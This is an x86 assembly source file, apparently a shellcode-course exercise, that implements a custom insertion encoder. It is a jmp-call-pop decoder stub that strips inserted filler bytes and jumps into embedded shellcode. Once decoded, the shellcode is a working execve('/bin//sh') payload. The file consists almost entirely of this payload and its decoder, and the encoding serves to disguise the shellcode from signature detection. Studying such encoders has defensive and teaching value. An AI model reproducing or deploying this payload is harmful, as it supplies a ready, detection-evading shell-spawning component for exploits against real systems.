; Custom Encoder (Insertion)
; SLAER

global _start:

section .text

_start:

jmp short caller

decoder:			; Managing pre-requisite

	pop esi			; Got hold of encoded shellcode in ESI using jmp-pop-call technique.
	xor edi,edi			; Also ESI pointing to first character i.e. 0x31 in this case.
	lea edi, [esi+1]	; Now edi pointing to first inserted character i.e. 0x60
	xor eax, eax		; Cleared EAX
	inc al			; Incremented AL by 1
	xor ebx, ebx		; Cleared EBX

decode: 			; Actual decode routine
	mov bl, byte [esi + eax]
	sub bl, 0x01
	cmp bl, 0x01
	jz short EncodedShell
	mov bl, byte [esi + eax + 1]
	mov byte [edi], bl
	inc edi
	add al, 2
	jmp short decode	

caller:

	call decoder
	EncodedShell: db 0x31,0x60,0xd2,0x03,0x31,0x16,0xc0,0xba,0x50,0xbb,0x68,0xfe,0x2f,0xc6,0x2f,0x2f,0x73,0xfe,0x68,0x1a,0x68,0x26,0x2f,0x78,0x62,0x13,0x69,0x06,0x6e,0x5d,0x89,0x43,0xe3,0xbb,0x89,0xb6,0xc1,0x50,0x89,0x24,0xc2,0x3a,0xb0,0xc3,0x0b,0x65,0xcd,0xd3,0x80,0x60,0x02,0x02
